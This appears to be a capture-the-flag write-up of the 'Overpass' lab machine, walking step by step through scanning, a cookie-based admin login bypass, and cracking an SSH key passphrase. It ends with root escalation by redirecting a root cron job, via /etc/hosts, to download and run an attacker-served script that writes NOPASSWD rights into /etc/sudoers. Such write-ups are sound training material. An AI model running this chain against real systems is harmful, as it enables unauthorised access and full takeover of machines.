export ip=10.10.35.206

# information gathering

## tool - nmap
- `nmap -sC -sV -oN nmap.log $ip`
  - open ports: 22, 80
- `nmap -p- -oN nmap_all_ports.log $ip`

## tool - gobuster
- `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip | tee gobuster.log`
  - got the admin panel at /admin

## tool - nikto
- `nikto -h $ip | tee nikto.log`

## process
- The index.html page source has an html comment which makes it obvious that, the encryption they are using for password manager is cypher text
- the source code is in go and upon reading that, it shows 
  - the encryption algoithm used is rot47
  - the passwords are stored in a directory ~/.overpass
- from gobuster we know there is an admin area, upon going there we see a login page.
- view the source of the login page and we see a login.js file. opening that we see custom javascript code to handle the logging in
- there is a check at the bottom of this login.js file which handles the incorrect credentials. 
- If the reposnse has incorrect credentials it just resets the admin form, but in the else condition, we see it is actually setting a session token cookie. But we don't know the value of the cookie `SessionToken`. but we can try setting the value to something and see if that does something to the admin page.
- I set `SessionToken=loggedIn` and I was able get past the admin login form.
- There is a private ssh key for the user james which we can actually use to get into the machine. save it as a file and try connecting to ssh.
- this ssh key file has a passphrase, so need to crack it before using it for the ssh connection
  - `ssh2john overpasssshkey > overpass.hash`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt overpass.john`
- `chmod 600 overpasssshkey` before connectinng using `ssh -i overpasssshkey james@$ip` and the password we got by cracking the sshkey hash using john
- After logging in we see two files in the home dir, one has the answer to the first question, the next one is a tasks file which says the password is stored using overpass. This means the password will be hashed and stored under the file .overpass in the home dir. We know this after reading the overpass.go source file. the .overpass indeed has a hash, so decoding it using https://www.dcode.fr/rot-47-cipher and we got the password of james
- now trying sudo, and we see james is not in the sudoers file. so transferring linpeas via scp and running it.
- this shows many vulnerabilities, but I found the crontab entry very interesting as /etc/ is writable by james as show in linpeas log as well.
- So crontab says it will download something from a url every min and execute it as root. So by editing /etc/host to change it the host's vpn ip, we can let the crontab get the buildscript.sh from our host.
- create file under the same directory structure we see in the crontab: `downloads/src/buildscript.sh` 
- add the below line to add james to the sudoers file
  - `echo "james  ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`
- start a python webserver with port 80
  - `python -m SimpleHTTPServer 80 .`
  - wait until the request details are shown in the http server terminal
- run sudo su and give james's password we got after decrypting the `.overpass` content.
- going to the root's home dir, we can see the root.txt with the final answer to finish the CTF.